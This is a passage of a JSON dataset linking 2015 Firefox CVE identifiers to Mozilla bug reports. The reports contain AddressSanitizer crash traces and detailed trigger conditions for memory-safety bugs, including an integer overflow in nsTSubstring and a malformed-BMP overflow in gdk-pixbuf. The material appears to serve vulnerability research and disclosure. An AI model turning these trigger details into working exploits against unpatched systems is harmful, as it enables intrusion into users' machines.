fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3e80005c70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3e80005c80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3e80005c90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3e80005ca0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==15811==ABORTING"
      }
    ],
    "CVE-2015-4486": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1178148",
        "title": "Out of bounds read in decrease_ref_count",
        "description": ">================================================================= >==18435==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61f00008dab0 at pc 0x7fcb35a73832 bp 0x7fcaf976e030 sp 0x7fcaf976e028 >READ of size 8 at 0x61f00008dab0 thread T101 (MediaPl~back #1) > #0 0x7fcb35a73831 in decrease_ref_count /build/firefox/src/media/libvpx/vp9/decoder/vp9_decoder.h:126 > #1 0x7fcb35c0044b in frame_worker_hook /build/firefox/src/media/libvpx/vp9/vp9_dx_iface.c:322 > #2 0x7fcb35a0ed76 in execute /build/firefox/src/media/libvpx/vp9/common/vp9_thread.c:134 > #3 0x7fcb35bffadd in decode_one /build/firefox/src/media/libvpx/vp9/vp9_dx_iface.c:493 > #4 0x7fcb35bf9507 in decoder_decode /build/firefox/src/media/libvpx/vp9/vp9_dx_iface.c:686 > #5 0x7fcb35c013c7 in vpx_codec_decode /build/firefox/src/media/libvpx/vpx/src/vpx_decoder.c:122 > #6 0x7fcb32ad4f6e in DecodeVideoFrame /build/firefox/src/dom/media/webm/SoftwareWebMVideoDecoder.cpp:149 > #7 0x7fcb3269a919 in RequestVideoData /build/firefox/src/dom/media/MediaDecoderReader.cpp:277 > #8 0x7fcb3278e93d in Invoke /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/MediaPromise.h:902 > #9 0x7fcb3278ec53 in Run /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/MediaPromise.h:919 > #10 0x7fcb32649dbc in Run /build/firefox/src/dom/media/TaskDispatcher.h:181 > #11 0x7fcb327d6489 in Run /build/firefox/src/dom/media/MediaTaskQueue.cpp:256 > #12 0x7fcb2dd6648e in Run /build/firefox/src/xpcom/threads/nsThreadPool.cpp:221 > #13 0x7fcb2dd66a6c in _ZThn8_N12nsThreadPool3RunEv /build/firefox/src/xpcom/threads/nsThreadPool.cpp:151 > #14 0x7fcb2dd60106 in ProcessNextEvent /build/firefox/src/xpcom/threads/nsThread.cpp:848 > #15 0x7fcb2ddd70fc in NS_ProcessNextEvent /build/firefox/src/xpcom/glue/nsThreadUtils.cpp:265 > #16 0x7fcb2e687ed6 in Run /build/firefox/src/ipc/glue/MessagePump.cpp:326 > #17 0x7fcb2e611c61 in RunInternal /build/firefox/src/ipc/chromium/src/base/message_loop.cc:234 > #18 0x7fcb2dd5cba1 in ThreadFunc /build/firefox/src/xpcom/threads/nsThread.cpp:360 > #19 0x7fcb3b5c5ffa in _pt_root /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:212 > #20 0x7fcb3bc0a181 in start_thread /build/buildd/eglibc-2.19/nptl/pthread_create.c:312 (discriminator 2) > #21 0x7fcb2b24047c in clone /build/buildd/eglibc-2.19/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:111 > >0x61f00008dab0 is located 17 bytes to the right of 3103-byte region [0x61f00008ce80,0x61f00008da9f) >allocated by thread T102 (MediaPl~back #2) here: > #0 0x4b6338 in __interceptor_malloc _asan_rtl_ (discriminator 14) > #1 0x7fcb35c03256 in vpx_memalign /build/firefox/src/media/libvpx/vpx_mem/vpx_mem.c:126 > #2 0x7fcb35bf853a in init_decoder /build/firefox/src/media/libvpx/vp9/vp9_dx_iface.c:372 > #3 0x7fcb35c013c7 in vpx_codec_decode /build/firefox/src/media/libvpx/vpx/src/vpx_decoder.c:122 > #4 0x7fcb32ad4f6e in DecodeVideoFrame /build/firefox/src/dom/media/webm/SoftwareWebMVideoDecoder.cpp:149 > #5 0x7fcb3269a919 in RequestVideoData /build/firefox/src/dom/media/MediaDecoderReader.cpp:277 > #6 0x7fcb3278e93d in Invoke /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/MediaPromise.h:902 > #7 0x7fcb3278ec53 in Run /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/MediaPromise.h:919 > #8 0x7fcb32649dbc in Run /build/firefox/src/dom/media/TaskDispatcher.h:181 > #9 0x7fcb327d6489 in Run /build/firefox/src/dom/media/MediaTaskQueue.cpp:256 > #10 0x7fcb2dd6648e in Run /build/firefox/src/xpcom/threads/nsThreadPool.cpp:221 > #11 0x7fcb2dd66a6c in _ZThn8_N12nsThreadPool3RunEv /build/firefox/src/xpcom/threads/nsThreadPool.cpp:151 > #12 0x7fcb2dd60106 in ProcessNextEvent /build/firefox/src/xpcom/threads/nsThread.cpp:848 > #13 0x7fcb2ddd70fc in NS_ProcessNextEvent /build/firefox/src/xpcom/glue/nsThreadUtils.cpp:265 > #14 0x7fcb2e687ed6 in Run /build/firefox/src/ipc/glue/MessagePump.cpp:326 > #15 0x7fcb2e611c61 in RunInternal /build/firefox/src/ipc/chromium/src/base/message_loop.cc:234 > #16 0x7fcb2dd5cba1 in ThreadFunc /build/firefox/src/xpcom/threads/nsThread.cpp:360 > #17 0x7fcb3b5c5ffa in _pt_root /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:212 > #18 0x7fcb3bc0a181 in start_thread /build/buildd/eglibc-2.19/nptl/pthread_create.c:312 (discriminator 2) > >Thread T101 (MediaPl~back #1) created by T0 (Web Content) here: > #0 0x430269 in __interceptor_pthread_create _asan_rtl_ (discriminator 7) > #1 0x7fcb3b5c2dbf in _PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:453 > #2 0x7fcb3b5c29ea in PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:544 > #3 0x7fcb2dd5df66 in Init /build/firefox/src/xpcom/threads/nsThread.cpp:470 > #4 0x7fcb2dd63c6f in NewThread /build/firefox/src/xpcom/threads/nsThreadManager.cpp:253 > #5 0x7fcb2dd653dd in PutEvent /build/firefox/src/xpcom/threads/nsThreadPool.cpp:102 > #6 0x7fcb2dd66eda in Dispatch /build/firefox/src/xpcom/threads/nsThreadPool.cpp:262 > #7 0x7fcb327d4c9e in DispatchLocked /build/firefox/src/dom/media/MediaTaskQueue.cpp:65 > #8 0x7fcb327383cf in Dispatch /build/firefox/src/objdir-ff-asan/dom/media/fmp4/../../../dist/include/MediaTaskQueue.h:52 > #9 0x7fcb32648958 in DispatchTaskGroup /build/firefox/src/dom/media/TaskDispatcher.h:233 > #10 0x7fcb32648567 in reset /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/mozilla/Maybe.h:373 > #11 0x7fcb3264abb0 in apply<mozilla::XPCOMThreadWrapper, void (mozilla::XPCOMThreadWrapper::*)()> /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/nsThreadUtils.h:618 (discriminator 4) > #12 0x7fcb337195e1 in RunSyncSectionsInternal /build/firefox/src/widget/nsBaseAppShell.cpp:376 > #13 0x7fcb3371a8be in AfterProcessNextEvent /build/firefox/src/widget/nsBaseAppShell.h:95 > #14 0x7fcb2dd60563 in ProcessNextEvent /build/firefox/src/xpcom/threads/nsThread.cpp:862 > #15 0x7fcb2ddd70fc in NS_ProcessNextEvent /build/firefox/src/xpcom/glue/nsThreadUtils.cpp:265 > #16 0x7fcb2e6870fe in Run /build/firefox/src/ipc/glue/MessagePump.cpp:95 > #17 0x7fcb2e611c61 in RunInternal /build/firefox/src/ipc/chromium/src/base/message_loop.cc:234 > #18 0x7fcb33717e6f in _ZN14nsBaseAppShell3RunEv /build/firefox/src/widget/nsBaseAppShell.cpp:165 > #19 0x7fcb356592c3 in XRE_RunAppShell /build/firefox/src/toolkit/xre/nsEmbedFunctions.cpp:778 > #20 0x7fcb2e611c61 in RunInternal /build/firefox/src/ipc/chromium/src/base/message_loop.cc:234 > #21 0x7fcb356587e7 in XRE_InitChildProcess /build/firefox/src/toolkit/xre/nsEmbedFunctions.cpp:614 > #22 0x4dbbf2 in content_process_main /build/firefox/src/ipc/app/../contentproc/plugin-container.cpp:236 > #23 0x7fcb2b167ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287 > >Thread T102 (MediaPl~back #2) created by T0 (Web Content) here: > #0 0x430269 in __interceptor_pthread_create _asan_rtl_ (discriminator 7) > #1 0x7fcb3b5c2dbf in _PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:453 > #2 0x7fcb3b5c29ea in PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:544 > #3 0x7fcb2dd5df66 in Init /build/firefox/src/xpcom/threads/nsThread.cpp:470 > #4 0x7fcb2dd63c6f in NewThread /build/firefox/src/xpcom/threads/nsThreadManager.cpp:253 > #5 0x7fcb2dd653dd in PutEvent /build/firefox/src/xpcom/threads/nsThreadPool.cpp:102 > #6 0x7fcb2dd66eda in Dispatch /build/firefox/src/xpcom/threads/nsThreadPool.cpp:262 > #7 0x7fcb327d4c9e in DispatchLocked /build/firefox/src/dom/media/MediaTaskQueue.cpp:65 > #8 0x7fcb327383cf in Dispatch /build/firefox/src/objdir-ff-asan/dom/media/fmp4/../../../dist/include/MediaTaskQueue.h:52 > #9 0x7fcb32648958 in DispatchTaskGroup /build/firefox/src/dom/media/TaskDispatcher.h:233 > #10 0x7fcb32648567 in reset /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/mozilla/Maybe.h:373 > #11 0x7fcb3264abb0 in apply<mozilla::XPCOMThreadWrapper, void (mozilla::XPCOMThreadWrapper::*)()> /build/firefox/src/objdir-ff-asan/dom/media/../../dist/include/nsThreadUtils.h:618 (discriminator 4) > #12 0x7fcb337195e1 in RunSyncSectionsInternal /build/firefox/src/widget/nsBaseAppShell.cpp:376 > #13 0x7fcb3371a8be in AfterProcessNextEvent /build/firefox/src/widget/nsBaseAppShell.h:95 > #14 0x7fcb2dd60563 in ProcessNextEvent /build/firefox/src/xpcom/threads/nsThread.cpp:862 > #15 0x7fcb2ddd70fc in NS_ProcessNextEvent /build/firefox/src/xpcom/glue/nsThreadUtils.cpp:265 > #16 0x7fcb2e6870fe in Run /build/firefox/src/ipc/glue/MessagePump.cpp:95 > #17 0x7fcb2e611c61 in RunInternal /build/firefox/src/ipc/chromium/src/base/message_loop.cc:234 > #18 0x7fcb33717e6f in _ZN14nsBaseAppShell3RunEv /build/firefox/src/widget/nsBaseAppShell.cpp:165 > #19 0x7fcb356592c3 in XRE_RunAppShell /build/firefox/src/toolkit/xre/nsEmbedFunctions.cpp:778 > #20 0x7fcb2e611c61 in RunInternal /build/firefox/src/ipc/chromium/src/base/message_loop.cc:234 > #21 0x7fcb356587e7 in XRE_InitChildProcess /build/firefox/src/toolkit/xre/nsEmbedFunctions.cpp:614 > #22 0x4dbbf2 in content_process_main /build/firefox/src/ipc/app/../contentproc/plugin-container.cpp:236 > #23 0x7fcb2b167ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287 > >Shadow bytes around the buggy address: > 0x0c3e80009b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x0c3e80009b10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x0c3e80009b20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x0c3e80009b30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 > 0x0c3e80009b40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >=>0x0c3e80009b50: 00 00 00 07 fa fa[fa]fa fa fa fa fa fa fa fa fa > 0x0c3e80009b60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c3e80009b70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c3e80009b80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c3e80009b90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c3e80009ba0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa >Shadow byte legend (one shadow byte represents 8 application bytes): > Addressable: 00 > Partially addressable: 01 02 03 04 05 06 07 > Heap left redzone: fa > Heap right redzone: fb > Freed heap region: fd > Stack left redzone: f1 > Stack mid redzone: f2 > Stack right redzone: f3 > Stack partial redzone: f4 > Stack after return: f5 > Stack use after scope: f8 > Global redzone: f9 > Global init order: f6 > Poisoned by user: f7 > Container overflow: fc > Array cookie: ac > Intra object redzone: bb > ASan internal: fe > Left alloca redzone: ca > Right alloca redzone: cb >==18435==ABORTING"
      }
    ],
    "CVE-2015-4487": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1171603",
        "title": "Overflow nsTSubstring::ReplacePrep causes memory-safety bugs in string library",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150305021524 Steps to reproduce: nsTSubstring::ReplacePrep (C:\\docs\\dev\\firefox\\source\\38.0.1\\xpcom\\string\\nsTSubstring.h) can cause memory to be written that the destination string object does not own. This bug could permit an attacker to write portions of Firefox's address space, potentially allowing her to execute code of her choice. The bug is in line 1003: 998: NS_WARN_UNUSED_RESULT bool ReplacePrep(index_type aCutStart, 999: size_type aCutLength, 1000: size_type aNewLength) 1001: { 1002: aCutLength = XPCOM_MIN(aCutLength, mLength - aCutStart); 1003: uint32_t newTotalLen = mLength - aCutLength + aNewLength; 1004: if (aCutStart == mLength && Capacity() > newTotalLen) { 1005: mFlags &= ~F_VOIDED; 1006: mData[newTotalLen] = char_type(0); 1007: mLength = newTotalLen; 1008: return true; 1009: } 1010: return ReplacePrepInternal(aCutStart, aCutLength, aNewLength, newTotalLen); 1011: } If aCutStart > mLength, aCutLength becomes a very large uint32_t. The same thing happens if aCutLength is very large, or if aNewLength is very large. In all of these cases, newTotalLen can overflow, resulting in a call to ReplacePrepInternal with a too-small newTotalLen. The simplest case is where aNewLength is very large. Using aNewLength == 0xfffffffe and mLength == 10 for the existing string, imagine a call to Append (&s, 0xfffffffe). (The same kind of thing works on AppendASCII, etc.). Append lives at nsTSubstring.h line 531: 531: void Append(const char_type* aData, size_type aLength = size_type(-1)) 532: { 533: Replace(mLength, 0, aData, aLength); 534: } The call to Replace resolves to the function at nsTSubstring.cpp line 502 with arguments (10, 0, &s, 0xfffffffe): 502: void 503: nsTSubstring_CharT::Replace(index_type aCutStart, size_type aCutLength, 504: const char_type* aData, size_type aLength) 505: { 506: if (!Replace(aCutStart, aCutLength, aData, aLength, 507: mozilla::fallible)) { 508: AllocFailed(Length() - aCutLength + 1); 509: } 510: } which then chains to the function at nsTSubstring.cpp line 512 with arguments (10, 0, &s, 0xfffffffe, mozilla::fallible)): 512: bool 513: nsTSubstring_CharT::Replace(index_type aCutStart, size_type aCutLength, 514: const char_type* aData, size_type aLength, 515: const fallible_t& aFallible) 516: { 517: // unfortunately, some callers pass null :-( 518: if (!aData) { 519: aLength = 0; 520: } else { 521: if (aLength == size_type(-1)) { 522: aLength = char_traits::length(aData); 523: } 524: 525: if (IsDependentOn(aData, aData + aLength)) { 526: nsTAutoString_CharT temp(aData, aLength); 527: return Replace(aCutStart, aCutLength, temp, aFallible); 528: } 529: } 530: 531: aCutStart = XPCOM_MIN(aCutStart, Length()); 532: 533: bool ok = ReplacePrep(aCutStart, aCutLength, aLength); 534: if (!ok) { 535: return false; 536: } 537: 538: if (aLength > 0) { 539: char_traits::copy(mData + aCutStart, aData, aLength); 540: } 541: 542: return true; 543: } Control passes to line 525, which returns false because aData does not overlap mData. Line 531 then computes 10 for aCutStart, so line 533 calls ReplacePrep (10, 0, 0xfffffffe). That function: 998: NS_WARN_UNUSED_RESULT bool ReplacePrep(index_type aCutStart, 999: size_type aCutLength, 1000: size_type aNewLength) 1001: { 1002: aCutLength = XPCOM_MIN(aCutLength, mLength - aCutStart); 1003: uint32_t newTotalLen = mLength - aCutLength + aNewLength; 1004: if (aCutStart == mLength && Capacity() > newTotalLen) { 1005: mFlags &= ~F_VOIDED; 1006: mData[newTotalLen] = char_type(0); 1007: mLength = newTotalLen; 1008: return true; 1009: } 1010: return ReplacePrepInternal(aCutStart, aCutLength, aNewLength, newTotalLen); 1011: } computes aCutLength == 0 on line 1002, and newTotalLen == 10 - 0 + 0xfffffffe == 8 on line 1003. The test on line 1004 passes, line 1006 spuriously writes a 0 to mData [8], and control returns to the caller (nsTSubstring_CharT::Replace) at line 534. Control then eventually passes to line 539: 539: char_traits::copy(mData + aCutStart, aData, aLength); which copies 0xfffffffe bytes from aData into the unallocated region beginning at mData + 10."
      }
    ],
    "CVE-2015-4489": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1182723",
        "title": "Self-assignment in nsTArray_Impl causes memory-safety bug",
        "description": "Assigning an array object based upon nsTArray_Impl to itself causes the destruction of the array's elements, followed by the construction of new elements from the memory that contained the destroyed elements. If the element type has a nontrivial destructor, this almost certainly results in the construction of invalid new elements, such as those containing pointers to unowned memory. The bug is that the copy-assignment operator does not check for self-assignment. I do not know whether any code actually does such a self-assignment. There is also a similar bug in the move-assignment operator, which is less serious because it clears the object, then assigns it to itself."
      }
    ],
    "CVE-2015-4490": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1086999",
        "title": "CSP: Asterisk (*) wildcard should not allow blob:, data:, or filesystem: when matching source expressions",
        "description": "There is a discrepancy in our CSP implementation and the spec. The spec says [1] that blob:, data:, and filesystem: should be excluded in case of a wildcard (allow all) when matching source expressions. Currently we allow all schemes in case of an asterisk wildcard, e.g. here: [2]. We should update our implementation to follow the spec. [1] http://www.w3.org/TR/CSP11/#match-source-expression [2] http://mxr.mozilla.org/mozilla-central/source/content/base/src/nsCSPUtils.cpp#291"
      }
    ],
    "CVE-2015-4491": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1184009",
        "title": "gdk-pixbuf heap overflow and DoS affecting Firefox",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0 Build ID: 20150629114848 Steps to reproduce: I'm forwarding this bug because it clearly affects last versions of Firefox. This was reported to upstream here (https://bugzilla.gnome.org/show_bug.cgi?id=752297) and it is supposed to be fixed (i haven't tested the patch yet). Requirements: * Linux x86_64 * gdk-pixbuf 2.31 or newer (you can upgrade only this package in Ubuntu/Debian download and installing from here: https://packages.debian.org/sid/libgdk-pixbuf2.0-0 or http://packages.ubuntu.com/vivid/libgdk-pixbuf2.0-0). Older versions are more difficult to exploit, but the issue is still there. * At least 10GB of real/virtual memory (a big swapfile will do the trick if you don't have enough physical memory). Steps to reproduce: 1. Download and decompress firefox-overflow.bmp.gz (it is compressed to avoid crashing my own browser!) 2. Try to open (ctrl+O) or attach firefox-overflow.bmp 3. Boom Actual results: Firefox crashes inside gdk-pixbuf code. Details: Program received signal SIGSEGV, Segmentation fault. make_filter_table (filter=0x7ffffffead10) at pixops.c:1294 1294 pixops.c: No such file or directory. (gdb) info registers rax 0x0 0 rbx 0x2 2 rcx 0x0 0 rdx 0x0 0 rsi 0x7fffbae00000 140736328630272 rdi 0x7fffbcfc8d00 140736364055808 rbp 0x7ffffffead10 0x7ffffffead10 rsp 0x7ffffffeab20 0x7ffffffeab20 r8 0x2b0000 2818048 r9 0x0 0 r10 0x4000010 67108880 r11 0x7fffbeb5000c 140736392921100 r12 0x8 8 r13 0x1 1 r14 0x1000003 16777219 r15 0x7fffbc436c00 140736351923200 rip 0x7fffedf57239 0x7fffedf57239 <pixops_process+681> eflags 0x10246 [ PF ZF IF RF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0 (gdb) x/i $rip => 0x7fffedf57239 <pixops_process+681>: mov %edx,(%rsi,%rax,4) Here %rsi depens on the dimension of the malformed bmp. Expected results: Of course, Firefox shouldn't so easily be exploitable. Nevertheless, it is not clear how Firefox can prevent this kind of vulnerabilities in the future (unless your re-implement gdk-pixbuf functions)"
      }
    ],
    "CVE-2015-4493": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1186718",
        "title": "Stagefright: heap-buffer-overflow crash [@stagefright::ESDS::parseESDescriptor]",
        "description": "Looks similar to Bug 1184871 but it's a heap-buffer-overflow not UAF. ==8659==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6080003bfe2d at pc 0x7f6d64764423 bp 0x7f6cde479850 sp 0x7f6cde479848 READ of size 1 at 0x6080003bfe2d thread T819 (MediaPl~back #1) #0 0x7f6d64764422 in parseESDescriptor /builds/slave/m-cen-l64-asan-000000000000000/build/src/media/libstagefright/frameworks/av/media/libstagefright/ESDS.cpp:157 #1 0x7f6d64744dd5 in parse /builds/slave/m-cen-l64-asan-000000000000000/build/src/media/libstagefright/frameworks/av/media/libstagefright/ESDS.cpp:121 #2 0x7f6d6474fb60 in GetTrackInfo /builds/slave/m-cen-l64-asan-000000000000000/build/src/media/libstagefright/binding/MP4Metadata.cpp:198 #3 0x7f6d69322a70 in MP4TrackDemuxer /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/fmp4/MP4Demuxer.cpp:206 #4 0x7f6d693217a1 in GetTrackDemuxer /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/fmp4/MP4Demuxer.cpp:145 #5 0x7f6d68ef7a26 in OnDemuxerInitDone /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/MediaFormatReader.cpp:309 #6 0x7f6d68f6d1f6 in RejectValue /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/MozPromise.h:433 #7 0x7f6d68f6add2 in DoResolveOrReject /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/MozPromise.h:383 #8 0x7f6d68f6a77f in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/MozPromise.h:316 #9 0x7f6d68e6dd0a in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/TaskDispatcher.h:180 #10 0x7f6d69005995 in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/TaskQueue.cpp:257 #11 0x7f6d649253d1 in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThreadPool.cpp:228 #12 0x7f6d6492578c in _ZThn8_N12nsThreadPool3RunEv /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/xpcom/threads/Unified_cpp_xpcom_threads0.cpp:242 #13 0x7f6d6491f2d7 in ProcessNextEvent /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThread.cpp:867 #14 0x7f6d6498df1a in NS_ProcessNextEvent /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/glue/nsThreadUtils.cpp:277 #15 0x7f6d651f755f in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/MessagePump.cpp:326 #16 0x7f6d6518345c in RunInternal /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:234 #17 0x7f6d6491b6f5 in ThreadFunc /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThread.cpp:360 #18 0x7f6d73148135 in _pt_root /builds/slave/m-cen-l64-asan-000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:212 #19 0x7f6d7666fe99 in start_thread /build/buildd/eglibc-2.15/nptl/pthread_create.c:308 #20 0x7f6d7576c31c in ?? /build/buildd/eglibc-2.15/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:112 AddressSanitizer can not describe address in more detail (wild memory access suspected). SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address: 0x0c108006ff70: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa 0x0c108006ff80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa 0x0c108006ff90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c108006ffa0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c108006ffb0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 04 fa =>0x0c108006ffc0: fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa fa fa 0x0c108006ffd0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa 0x0c108006ffe0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c108006fff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c1080070000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c1080070010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe Thread T819 (MediaPl~back #1) created by T0 here: #0 0x45eae5 in __interceptor_pthread_create _asan_rtl_ #1 0x7f6d73144abd in _PR_CreateThread /builds/slave/m-cen-l64-asan-000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:453 #2 0x7f6d7314463a in PR_CreateThread /builds/slave/m-cen-l64-asan-000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:544 #3 0x7f6d6491cced in Init /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThread.cpp:470 #4 0x7f6d64922cee in NewThread /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThreadManager.cpp:249 #5 0x7f6d649243be in PutEvent /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThreadPool.cpp:109 #6 0x7f6d64925c97 in Dispatch /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThreadPool.cpp:276 #7 0x7f6d690040f9 in operator nsIEventTarget * /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/nsIEventTarget.h:37 #8 0x7f6d68fc8bec in Dispatch /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/platforms/../../../dist/include/mozilla/TaskQueue.h:47 #9 0x7f6d68e6d67c in DispatchTaskGroup /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/TaskDispatcher.h:232 #10 0x7f6d68e6c322 in ~AutoTaskDispatcher /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/TaskDispatcher.h:87 #11 0x7f6d68e6b471 in reset /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/Maybe.h:373 #12 0x7f6d68e6b610 in apply<mozilla::XPCOMThreadWrapper, void (mozilla::XPCOMThreadWrapper::*)()> /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/media/../../dist/include/nsThreadUtils.h:621 #13 0x7f6d69ec5125 in assign_assuming_AddRef /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/widget/../dist/include/nsCOMPtr.h:336 #14 0x7f6d69ec5ccd in AfterProcessNextEvent /builds/slave/m-cen-l64-asan-000000000000000/build/src/widget/nsBaseAppShell.h:95 #15 0x7f6d6491f7a0 in ProcessNextEvent /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThread.cpp:881 #16 0x7f6d6498df1a in NS_ProcessNextEvent /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/glue/nsThreadUtils.cpp:277 #17 0x7f6d651f65e9 in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/MessagePump.cpp:95 #18 0x7f6d6518345c in RunInternal /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:234 #19 0x7f6d69ec38d7 in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/widget/nsBaseAppShell.cpp:165 #20 0x7f6d6bc200f8 in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/components/startup/nsAppStartup.cpp:280 #21 0x7f6d6bd28e17 in XRE_mainRun /builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsAppRunner.cpp:4288 #22 0x7f6d6bd29e75 in XRE_main /builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsAppRunner.cpp:4385 #23 0x7f6d6bd2acf5 in XRE_main /builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsAppRunner.cpp:4474 #24 0x48a6e4 in do_main /builds/slave/m-cen-l64-asan-000000000000000/build/src/browser/app/nsBrowserApp.cpp:212 #25 0x7f6d7569976c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226 